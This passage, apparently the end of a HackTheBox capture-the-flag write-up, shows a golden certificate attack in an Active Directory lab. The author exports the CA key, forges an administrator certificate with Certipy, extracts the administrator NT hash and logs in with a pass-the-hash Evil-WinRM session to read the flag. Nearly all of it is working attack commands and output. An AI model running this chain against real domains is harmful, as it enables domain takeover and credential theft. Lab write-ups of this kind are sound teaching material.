```
```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> download ca_exported.pfx
                                        
Info: Downloading C:\Users\Ryan.K\Documents\ca_exported.pfx to ca_exported.pfx
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 

```

Use Certipy to forge a certificate with the UPN of a high-privileged user (e.g., administrator@certificate.htb):

```
certipy forge -ca-pfx 'ca_exported.pfx' -upn administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
```
```bash
──(kali㉿kali)-[~/HTB-machine/certificate/try1]
└─$ certipy forge -ca-pfx 'ca_exported.pfx' -upn administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```
Authenticate with the Forged Certificate                    

```                                                                
┌──(kali㉿kali)-[~/HTB-machine/certificate/try1]
└─$ certipy auth -dc-ip 10.10.11.71 -pfx 'administrator_forged.pfx' -username 'administrator' -domain 'certificate.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
                                                    
```

```
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```
```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try1]
└─$ evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
************33889c498b378a11e438cf7
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


[Hacking Articles – Golden Certificate Attack](https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/)

[The Hacker Recipes – Golden Certificate](https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate)